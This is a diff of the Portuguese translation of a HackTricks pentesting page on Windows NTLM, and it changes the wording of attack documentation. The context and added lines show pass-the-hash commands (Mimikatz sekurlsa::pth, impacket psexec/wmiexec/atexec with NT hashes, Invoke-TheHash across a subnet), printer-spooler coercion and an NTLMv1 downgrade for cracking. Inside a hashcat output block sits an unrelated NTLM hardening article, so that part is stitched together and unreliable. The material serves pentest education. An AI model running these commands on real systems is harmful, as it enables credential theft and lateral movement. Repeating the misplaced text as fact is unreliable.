@@ -1,16 +1,16 @@
 # NTLM
 
 {% hint style="success" %}
-Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
 <summary>Support HackTricks</summary>
 
-* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
-* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
+* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
+* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 {% endhint %}
@@ -19,7 +19,7 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 
 Em ambientes onde **Windows XP e Server 2003** estão em operação, hashes LM (Lan Manager) são utilizados, embora seja amplamente reconhecido que estes podem ser facilmente comprometidos. Um hash LM específico, `AAD3B435B51404EEAAD3B435B51404EE`, indica um cenário onde o LM não é empregado, representando o hash para uma string vazia.
 
-Por padrão, o protocolo de autenticação **Kerberos** é o método principal utilizado. O NTLM (NT LAN Manager) entra em cena sob circunstâncias específicas: ausência de Active Directory, inexistência do domínio, mau funcionamento do Kerberos devido a configuração inadequada, ou quando conexões são tentadas usando um endereço IP em vez de um nome de host válido.
+Por padrão, o protocolo de autenticação **Kerberos** é o método principal utilizado. O NTLM (NT LAN Manager) entra em cena sob circunstâncias específicas: ausência de Active Directory, não existência do domínio, mau funcionamento do Kerberos devido a configuração inadequada, ou quando conexões são tentadas usando um endereço IP em vez de um nome de host válido.
 
 A presença do cabeçalho **"NTLMSSP"** em pacotes de rede sinaliza um processo de autenticação NTLM.
 
@@ -90,7 +90,7 @@ O **hash NT (16bytes)** é dividido em **3 partes de 7bytes cada** (7B + 7B + (2
 
 Atualmente, está se tornando menos comum encontrar ambientes com Delegação Não Restrita configurada, mas isso não significa que você não pode **abusar de um serviço de Print Spooler** configurado.
 
-Você poderia abusar de algumas credenciais/sessões que já possui no AD para **pedir à impressora que se autentique** contra algum **host sob seu controle**. Então, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação para 1122334455667788**, capturar a tentativa de autenticação e, se foi feito usando **NTLMv1**, você poderá **quebrá-lo**.\
+Você poderia abusar de algumas credenciais/sessões que já possui no AD para **pedir à impressora que se autentique** contra algum **host sob seu controle**. Então, usando `metasploit auxiliary/server/capture/smb` ou `responder`, você pode **definir o desafio de autenticação como 1122334455667788**, capturar a tentativa de autenticação e, se foi feito usando **NTLMv1**, você poderá **quebrá-lo**.\
 Se você estiver usando `responder`, pode tentar \*\*usar a flag `--lm` \*\* para tentar **rebaixar** a **autenticação**.\
 _Observe que para esta técnica a autenticação deve ser realizada usando NTLMv1 (NTLMv2 não é válido)._
 
@@ -98,7 +98,7 @@ Lembre-se de que a impressora usará a conta do computador durante a autenticaç
 
 ### Ataque NTLMv1 com hashcat
 
-NTLMv1 também pode ser quebrado com a ferramenta Multi NTLMv1 [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formata mensagens NTLMv1 de uma maneira que pode ser quebrada com hashcat.
+NTLMv1 também pode ser quebrado com a ferramenta NTLMv1 Multi [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), que formata mensagens NTLMv1 de uma maneira que pode ser quebrada com hashcat.
 
 O comando
 ```bash
@@ -135,28 +135,28 @@ NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 
 ## Introdução
 
-O NTLM (NT LAN Manager) é um protocolo de autenticação que foi amplamente utilizado em versões anteriores do Windows. Embora tenha sido substituído pelo Kerberos em muitas situações, o NTLM ainda é usado em ambientes onde a compatibilidade com versões mais antigas do Windows é necessária.
+O NTLM (NT LAN Manager) é um protocolo de autenticação que foi amplamente utilizado em versões anteriores do Windows. Embora ainda seja suportado, ele é considerado menos seguro em comparação com métodos mais modernos de autenticação, como Kerberos. Este documento fornece diretrizes para endurecer o uso do NTLM em ambientes Windows.
 
-## Técnicas de Dureza
+## Diretrizes de Endurecimento
 
-1. **Desativar NTLM onde não for necessário**  
-   Sempre que possível, desative o NTLM em sistemas e aplicativos que não o utilizam. Isso reduz a superfície de ataque.
+1. **Desativar NTLM onde possível**  
+   Sempre que possível, desative o NTLM e utilize Kerberos como método de autenticação.
 
-2. **Usar autenticação Kerberos**  
-   Sempre que possível, utilize o Kerberos em vez do NTLM. O Kerberos é mais seguro e oferece melhor proteção contra ataques.
+2. **Limitar o uso do NTLM**  
+   Se o NTLM precisar ser usado, limite seu uso a sistemas e serviços que realmente necessitam dele.
 
-3. **Configurar políticas de segurança**  
-   Aplique políticas de segurança que limitem o uso do NTLM. Isso pode incluir a configuração de políticas de grupo para restringir o uso do NTLM em toda a rede.
+3. **Auditar o uso do NTLM**  
+   Habilite a auditoria para monitorar o uso do NTLM e identificar possíveis vulnerabilidades.
 
-4. **Monitorar o uso do NTLM**  
-   Monitore o uso do NTLM em sua rede para identificar possíveis abusos ou vazamentos. Ferramentas de monitoramento podem ajudar a detectar quando o NTLM está sendo usado indevidamente.
+4. **Implementar políticas de segurança**  
+   Aplique políticas de segurança que restrinjam o uso do NTLM em sua rede.
 
 5. **Atualizar sistemas**  
-   Mantenha todos os sistemas atualizados com os patches de segurança mais recentes. Isso ajuda a proteger contra vulnerabilidades conhecidas que podem ser exploradas em ataques NTLM.
+   Mantenha todos os sistemas atualizados com os patches de segurança mais recentes.
 
 ## Conclusão
 
-A dureza do NTLM é uma parte importante da segurança em ambientes Windows. Implementar as técnicas acima pode ajudar a proteger sua rede contra ataques que exploram o NTLM.
+O endurecimento do NTLM é uma parte importante da segurança em ambientes Windows. Seguir estas diretrizes ajudará a proteger sua rede contra possíveis ataques.
 ```
 ```bash
 727B4E35F947129E:1122334455667788
@@ -201,7 +201,7 @@ O **tamanho do desafio é de 8 bytes** e **2 respostas são enviadas**: Uma tem 
 
 A **segunda resposta** é criada usando **vários valores** (um novo desafio do cliente, um **timestamp** para evitar **ataques de repetição**...)
 
-Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, pode seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+Se você tiver um **pcap que capturou um processo de autenticação bem-sucedido**, pode seguir este guia para obter o domínio, nome de usuário, desafio e resposta e tentar quebrar a senha: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
@@ -216,7 +216,7 @@ Você precisa usar uma **ferramenta** que irá **realizar** a **autenticação N
 ```bash
 Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
-Isso iniciará um processo que pertencerá aos usuários que lançaram o mimikatz, mas internamente no LSASS, as credenciais salvas são aquelas dentro dos parâmetros do mimikatz. Então, você pode acessar recursos de rede como se fosse aquele usuário (semelhante ao truque `runas /netonly`, mas você não precisa saber a senha em texto claro).
+Isso irá iniciar um processo que pertencerá aos usuários que lançaram o mimikatz, mas internamente no LSASS, as credenciais salvas são aquelas dentro dos parâmetros do mimikatz. Então, você pode acessar recursos de rede como se fosse aquele usuário (semelhante ao truque `runas /netonly`, mas você não precisa saber a senha em texto claro).
 
 ### Pass-the-Hash do linux
 
@@ -225,12 +225,12 @@ Você pode obter execução de código em máquinas Windows usando Pass-the-Hash
 
 ### Ferramentas compiladas do Impacket para Windows
 
-Você pode baixar [binários do impacket para Windows aqui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
+Você pode baixar [binaries do impacket para Windows aqui](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
 * **atexec.exe** (Neste caso, você precisa especificar um comando, cmd.exe e powershell.exe não são válidos para obter um shell interativo)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* Existem vários outros binários do Impacket...
+* Existem vários outros binaries do Impacket...
 
 ### Invoke-TheHash
 
@@ -254,13 +254,13 @@ Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff
 ```
 #### Invoke-TheHash
 
-Esta função é uma **mistura de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um de **SMBExec** e **WMIExec**, mas **não** fornecer nenhum parâmetro _**Command**_, ele apenas **verificará** se você tem **permissões suficientes**.
+Esta função é uma **mistura de todas as outras**. Você pode passar **vários hosts**, **excluir** alguns e **selecionar** a **opção** que deseja usar (_SMBExec, WMIExec, SMBClient, SMBEnum_). Se você selecionar **qualquer** um de **SMBExec** e **WMIExec**, mas não fornecer nenhum parâmetro _**Command**_, ele apenas **verificará** se você tem **permissões suficientes**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
 ### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
 
-### Editor de Credenciais do Windows (WCE)
+### Windows Credentials Editor (WCE)
 
 **Precisa ser executado como administrador**
 
